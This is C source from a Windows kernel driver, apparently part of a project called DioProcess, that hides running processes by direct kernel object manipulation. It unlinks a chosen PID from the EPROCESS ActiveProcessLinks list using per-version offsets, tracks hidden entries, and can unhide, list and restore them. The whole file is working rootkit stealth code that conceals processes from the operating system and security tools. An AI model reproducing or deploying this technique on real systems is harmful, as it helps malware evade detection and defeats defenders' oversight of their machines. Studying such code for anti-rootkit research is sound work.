#include "../pch.h"
#include "../DioProcessGlobals.h"
#include "ProcessHide.h"

// ============== Global Variable Definitions ==============

PHIDDEN_PROCESS_ENTRY g_ProcessHideListHead = NULL;
ULONG g_ProcessHideCount = 0;
BOOLEAN g_ProcessHideInitialized = FALSE;

// ============== Initialization / Cleanup ==============

VOID ProcessHide_Init()
{
	WINDOWS_VERSION ver = GetWindowsVersion();
	if (ver == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "ProcessHide: unsupported Windows version, DKOM hiding unavailable\n"));
		return;
	}

	g_ProcessHideListHead = NULL;
	g_ProcessHideCount = 0;
	g_ProcessHideInitialized = TRUE;

	KdPrint((DRIVER_PREFIX "ProcessHide initialized (ActiveProcessLinks=0x%X, UniqueProcessId=0x%X)\n",
		EPROCESS_ACTIVEPROCESSLINKS_OFFSET[ver],
		EPROCESS_UNIQUEPROCESSID_OFFSET[ver]));
}

VOID ProcessHide_Cleanup()
{
	if (!g_ProcessHideInitialized)
		return;

	KIRQL oldIrql;
	KeRaiseIrql(APC_LEVEL, &oldIrql);

	// Unhide all hidden processes before unloading
	while (g_ProcessHideListHead)
	{
		PHIDDEN_PROCESS_ENTRY current = g_ProcessHideListHead;
		ULONG pid = current->Pid;

		__try
		{
			// Validate pointers before restoring
			if (current->ProcessListEntry && MmIsAddressValid(current->ProcessListEntry) &&
				MmIsAddressValid(current->OriginalBlink) && MmIsAddressValid(current->OriginalFlink) &&
				MmIsAddressValid(current->OriginalBlink->Flink) && MmIsAddressValid(current->OriginalFlink->Blink))
			{
				// Restore the doubly-linked list
				current->OriginalBlink->Flink = current->ProcessListEntry;
				current->OriginalFlink->Blink = current->ProcessListEntry;
				current->ProcessListEntry->Blink = current->OriginalBlink;
				current->ProcessListEntry->Flink = current->OriginalFlink;

				KdPrint((DRIVER_PREFIX "ProcessHide cleanup: restored PID %lu\n", pid));
			}
			else
			{
				KdPrint((DRIVER_PREFIX "ProcessHide cleanup: skipping PID %lu (invalid pointers)\n", pid));
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint((DRIVER_PREFIX "ProcessHide cleanup: exception restoring PID %lu (0x%X)\n", pid, GetExceptionCode()));
		}

		g_ProcessHideListHead = current->Next;
		ExFreePoolWithTag(current, DKOM_POOL_TAG);
		g_ProcessHideCount--;
	}

	KeLowerIrql(oldIrql);

	g_ProcessHideInitialized = FALSE;
	KdPrint((DRIVER_PREFIX "ProcessHide cleanup complete\n"));
}

// ============== Hide ==============

NTSTATUS ProcessHide_Hide(ULONG Pid)
{
	if (!g_ProcessHideInitialized)
		return STATUS_NOT_SUPPORTED;

	WINDOWS_VERSION ver = GetWindowsVersion();
	if (ver == WINDOWS_UNSUPPORTED)
		return STATUS_NOT_SUPPORTED;

	if (g_ProcessHideCount >= MAX_HIDDEN_PROCESSES)
	{
		KdPrint((DRIVER_PREFIX "ProcessHide: maximum hidden processes reached (%d)\n", MAX_HIDDEN_PROCESSES));
		return STATUS_QUOTA_EXCEEDED;
	}

	// Check if already hidden
	PHIDDEN_PROCESS_ENTRY check = g_ProcessHideListHead;
	while (check)
	{
		if (check->Pid == Pid)
		{
			KdPrint((DRIVER_PREFIX "ProcessHide: PID %lu is already hidden\n", Pid));
			return STATUS_ALREADY_REGISTERED;
		}
		check = check->Next;
	}

	// Pre-allocate tracking entry BEFORE raising IRQL (pool alloc can't be at elevated IRQL)
	PHIDDEN_PROCESS_ENTRY hidden = (PHIDDEN_PROCESS_ENTRY)ExAllocatePool2(
		POOL_FLAG_NON_PAGED,
		sizeof(HIDDEN_PROCESS_ENTRY),
		DKOM_POOL_TAG);

	if (!hidden)
	{
		KdPrint((DRIVER_PREFIX "ProcessHide: failed to allocate memory for PID %lu\n", Pid));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	RtlZeroMemory(hidden, sizeof(HIDDEN_PROCESS_ENTRY));

	ULONG aplOffset = EPROCESS_ACTIVEPROCESSLINKS_OFFSET[ver];
	ULONG upidOffset = EPROCESS_UNIQUEPROCESSID_OFFSET[ver];
	ULONG imgNameOffset = EPROCESS_IMAGEFILENAME_OFFSET[ver];

	NTSTATUS status = STATUS_NOT_FOUND;

	// Raise IRQL to prevent preemption during list modification
	KIRQL oldIrql;
	KeRaiseIrql(APC_LEVEL, &oldIrql);

	__try
	{
		// Walk ActiveProcessLinks from current process
		PEPROCESS currentProcess = PsGetCurrentProcess();
		PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)currentProcess + aplOffset);
		PLIST_ENTRY head = listEntry;
		ULONG safetyCounter = 0;
		const ULONG MAX_WALK = 65536;  // Safety limit to prevent infinite loop

		do {
			if (!MmIsAddressValid(listEntry))
			{
				KdPrint((DRIVER_PREFIX "ProcessHide: invalid list entry at 0x%p, aborting walk\n", listEntry));
				status = STATUS_INVALID_ADDRESS;
				break;
			}

			PEPROCESS entryProcess = (PEPROCESS)((PUCHAR)listEntry - aplOffset);

			if (!MmIsAddressValid((PVOID)((PUCHAR)entryProcess + upidOffset)))
			{
				listEntry = listEntry->Flink;
				safetyCounter++;
				continue;
			}

			ULONG entryPid = *(ULONG*)((PUCHAR)entryProcess + upidOffset);

			if (entryPid == Pid)
			{
				// Save state
				hidden->Pid = Pid;
				hidden->ProcessListEntry = listEntry;
				hidden->OriginalFlink = listEntry->Flink;
				hidden->OriginalBlink = listEntry->Blink;

				// Copy ImageFileName
				if (imgNameOffset != 0 && MmIsAddressValid((PVOID)((PUCHAR)entryProcess + imgNameOffset)))
				{
					PCHAR imageName = (PCHAR)((PUCHAR)entryProcess + imgNameOffset);
					RtlCopyMemory(hidden->ImageFileName, imageName, 15);
				}

				// Validate neighbors before unlinking
				if (!MmIsAddressValid(listEntry->Blink) || !MmIsAddressValid(listEntry->Flink))
				{
					KdPrint((DRIVER_PREFIX "ProcessHide: invalid Flink/Blink for PID %lu\n", Pid));
					status = STATUS_INVALID_ADDRESS;
					break;
				}

				// Insert into tracking list (BEFORE unlinking so cleanup can restore on failure)
				hidden->Next = g_ProcessHideListHead;
				g_ProcessHideListHead = hidden;
				g_ProcessHideCount++;

				// Unlink from ActiveProcessLinks
				listEntry->Blink->Flink = listEntry->Flink;
				listEntry->Flink->Blink = listEntry->Blink;

				// Self-reference for stability (process kernel code still walks its own node)
				listEntry->Flink = listEntry;
				listEntry->Blink = listEntry;

				KdPrint((DRIVER_PREFIX "ProcessHide: PID %lu (%s) hidden via DKOM\n", Pid, hidden->ImageFileName));
				hidden = NULL;  // Don't free — it's in the tracking list now
				status = STATUS_SUCCESS;
				break;
			}

			listEntry = listEntry->Flink;
			safetyCounter++;
		} while (listEntry != head && safetyCounter < MAX_WALK);

		if (safetyCounter >= MAX_WALK)
		{
			KdPrint((DRIVER_PREFIX "ProcessHide: safety limit reached walking ActiveProcessLinks\n"));
			status = STATUS_UNSUCCESSFUL;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "ProcessHide: exception during hide of PID %lu (0x%X)\n", Pid, GetExceptionCode()));
		status = STATUS_UNHANDLED_EXCEPTION;
	}

	KeLowerIrql(oldIrql);

	// Free the pre-allocated entry if we didn't use it
	if (hidden)
	{
		ExFreePoolWithTag(hidden, DKOM_POOL_TAG);
	}

	return status;
}

// ============== Unhide ==============

NTSTATUS ProcessHide_Unhide(ULONG Pid)
{
	if (!g_ProcessHideInitialized)
		return STATUS_NOT_SUPPORTED;

	NTSTATUS status = STATUS_NOT_FOUND;

	// Raise IRQL during list re-link
	KIRQL oldIrql;
	KeRaiseIrql(APC_LEVEL, &oldIrql);

	__try
	{
		PHIDDEN_PROCESS_ENTRY prev = NULL;
		PHIDDEN_PROCESS_ENTRY current = g_ProcessHideListHead;

		while (current)
		{
			if (current->Pid == Pid)
			{
				// Validate all pointers before touching the list
				if (!current->ProcessListEntry || !MmIsAddressValid(current->ProcessListEntry) ||
					!MmIsAddressValid(current->OriginalBlink) || !MmIsAddressValid(current->OriginalFlink) ||
					!MmIsAddressValid(current->OriginalBlink->Flink) || !MmIsAddressValid(current->OriginalFlink->Blink))
				{
					KdPrint((DRIVER_PREFIX "ProcessHide: invalid pointers for PID %lu, cannot unhide\n", Pid));
					status = STATUS_INVALID_ADDRESS;
					break;
				}

				// Restore doubly-linked list
				current->OriginalBlink->Flink = current->ProcessListEntry;
				current->OriginalFlink->Blink = current->ProcessListEntry;
				current->ProcessListEntry->Blink = current->OriginalBlink;
				current->ProcessListEntry->Flink = current->OriginalFlink;

				// Remove from tracking list
				if (prev)
					prev->Next = current->Next;
				else
					g_ProcessHideListHead = current->Next;

				g_ProcessHideCount--;

				KdPrint((DRIVER_PREFIX "ProcessHide: PID %lu (%s) restored\n", Pid, current->ImageFileName));

				KeLowerIrql(oldIrql);
				ExFreePoolWithTag(current, DKOM_POOL_TAG);
				return STATUS_SUCCESS;
			}

			prev = current;
			current = current->Next;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "ProcessHide: exception during unhide of PID %lu (0x%X)\n", Pid, GetExceptionCode()));
		status = STATUS_UNHANDLED_EXCEPTION;
	}

	KeLowerIrql(oldIrql);

	if (status == STATUS_NOT_FOUND)
		KdPrint((DRIVER_PREFIX "ProcessHide: PID %lu not found in hidden list\n", Pid));

	return status;
}

// ============== List ==============

NTSTATUS ProcessHide_List(HiddenProcessEntry* Entries, ULONG* Count, ULONG MaxEntries)
{
	if (!g_ProcessHideInitialized)
	{
		*Count = 0;
		return STATUS_SUCCESS;
	}

	ULONG idx = 0;
	PHIDDEN_PROCESS_ENTRY current = g_ProcessHideListHead;

	while (current && idx < MaxEntries)
	{
		Entries[idx].Pid = current->Pid;
		RtlCopyMemory(Entries[idx].ProcessName, current->ImageFileName, 16);
		idx++;
		current = current->Next;
	}

	*Count = idx;
	return STATUS_SUCCESS;
}
